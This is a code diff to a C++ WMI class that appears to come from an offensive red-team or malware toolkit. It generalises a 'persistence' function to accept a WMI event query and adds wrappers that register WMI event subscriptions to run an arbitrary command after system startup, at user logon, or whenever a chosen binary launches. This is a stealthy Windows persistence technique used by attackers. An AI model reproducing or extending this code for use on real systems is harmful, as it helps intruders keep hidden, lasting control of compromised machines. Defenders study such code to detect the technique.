@@ -354,7 +354,7 @@ bool WMI::setUpWBEM(const wchar_t* wmi_namespace, const char* host, const char* 
 /*
 * Authenticate to ROOT\\SUBSCRIPTION first
 */
-bool WMI::persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command)
+bool WMI::persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command, const wchar_t* query)
 {
 	// Source: https://github.com/wumb0/sh3llparty/blob/master/wmicallback.cpp
 
@@ -439,7 +439,8 @@ bool WMI::persistence(const wchar_t* ef_class_name, const wchar_t* ec_class_name
 	hres = ef->Put(L"QueryLanguage", 0, &var, CIM_STRING);
 
 	// Set Query
-	var.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Caption = \"chrome.exe\"");
+	var.bstrVal = _bstr_t(query);
+	//var.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Caption = \"chrome.exe\"");
 	hres = ef->Put(L"Query", 0, &var, CIM_STRING);
 
 	hres = wbemServices->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
@@ -530,6 +531,32 @@ rip:
 
 	return success;
 }
+
+/*
+* Authenticate to ROOT\\SUBSCRIPTION first
+*/
+bool WMI::persistence_startup(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command)
+{
+	return this->persistence(ef_class_name, ec_class_name, command, L"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325");
+}
+
+/*
+* Authenticate to ROOT\\SUBSCRIPTION first
+*/
+bool WMI::persistence_userlogon(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command)
+{
+	return this->persistence(ef_class_name, ec_class_name, command, L"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'");
+}
+
+/*
+* Authenticate to ROOT\\SUBSCRIPTION first
+*/
+bool WMI::persistence_onexecution(const wchar_t* ef_class_name, const wchar_t* ec_class_name, const wchar_t* command, const wchar_t* binary)
+{
+	std::wstring query = L"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Caption = \"" + std::wstring(binary) + L"\"";
+	return this->persistence(ef_class_name, ec_class_name, command, query.c_str());
+}
+
 
 /*
 * Authenticate to ROOT\\SUBSCRIPTION first
